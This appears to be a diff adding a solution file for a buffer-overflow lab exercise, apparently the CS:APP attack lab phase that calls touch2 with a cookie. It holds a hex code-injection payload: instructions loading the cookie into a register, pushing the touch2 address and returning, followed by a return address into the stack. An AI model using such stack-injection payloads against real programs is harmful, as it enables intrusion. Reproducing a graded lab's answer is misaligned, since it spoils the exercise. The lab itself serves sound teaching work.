@@ -1,0 +1,6 @@
+/* padding with code inject */
+bf 7c 74 93 1b 68 1c 5b /* mov &cookie, %edi */
+55 55 48 c7 44 24 04 55 /* pushq touch2(back) */
+55 00 00 c3 00 00 00 00 /* mov touch2(front), 0x4(%rsp)  ret  */
+/* code inject address */
+18 49 62 55 00 00 00 00
